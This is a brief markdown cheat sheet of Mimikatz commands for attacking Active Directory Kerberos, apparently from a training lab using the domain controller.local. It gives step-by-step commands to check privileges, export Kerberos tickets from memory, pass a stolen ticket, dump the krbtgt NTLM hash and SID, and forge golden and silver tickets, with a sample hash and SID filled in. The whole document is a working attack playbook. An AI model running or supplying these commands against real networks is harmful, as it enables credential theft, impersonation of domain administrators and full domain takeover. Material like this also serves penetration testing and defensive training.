### check privs
`privilege::debug`
Output '20' means you have admin privs

---

### export .kirbi tickets into current dir
`sekurlsa::tickets /export`

try looking for admin ticket from krbtgt

---

### pass the ticket
`kerberos::ptt <ticket>` 
will cache and impersonate given ticket

example: 
```
kerberos::ptt [0;2a7822]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```

you will now have the ticket in your cache. you can verify in cmd using `klist`

---

### golden ticket

`lsadump::lsa /inject /name:krbtgt` 
will dump NTLM hash and SID needed to create golden ticket

for silver ticket you need to change `/name:` to dump hash of domain admin or service account

Creating the golden ticket:
`kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:`

example:
```
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-15021
58860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```

to create a silver ticket - put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.





